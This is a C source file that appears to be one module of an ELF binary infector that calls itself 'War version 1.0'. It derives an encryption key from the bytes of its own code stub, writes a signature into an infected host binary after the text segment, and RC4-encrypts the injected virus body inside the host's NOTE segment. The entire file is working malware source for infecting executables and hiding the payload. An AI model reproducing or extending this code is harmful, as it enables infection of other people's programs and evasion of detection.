#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void generate_key(unsigned char *key)
{
	char *stub = (char *)L1;
	const size_t stub_size = (void *)__exit - (void *)L1;

	_bzero((char *)key, DEFAULT_KEY_SIZE);

	for (register size_t index = 0; index < stub_size; index++)
	{
		key[index % DEFAULT_KEY_SIZE] += stub[index];
	}
}

__attribute__((always_inline)) static inline void generate_signature(char *dst, const Elf64_Phdr *segment, const unsigned char *key)
{
	const char beg[] = "War version 1.0 (c)oded by <jle-quel><ddinaut> - [";
	const char end[] = "]";
	const size_t size = _strlen(beg);

	dst += segment->p_offset + segment->p_filesz; 

	_memcpy(dst, beg, size);

	for (register size_t index = 0; index < DEFAULT_KEY_SIZE; index++)
	{
		*(dst + (size + index)) = (key[index] % 10) + 65;
	}

	_memcpy(dst + (size + DEFAULT_KEY_SIZE), end, 1);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void key(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
{

#if LOGGER
	MID_LOGGER("key:\t\t\t");
#endif

	if (context == FAILURE)
		goto label;

	unsigned char key[DEFAULT_KEY_SIZE];

	generate_key(key);
	generate_signature(injection->ptr, host->segment[TEXT], key);

	RC4(key, DEFAULT_KEY_SIZE, injection->ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);

label:
	clean(host, keychain, context, injection);
}
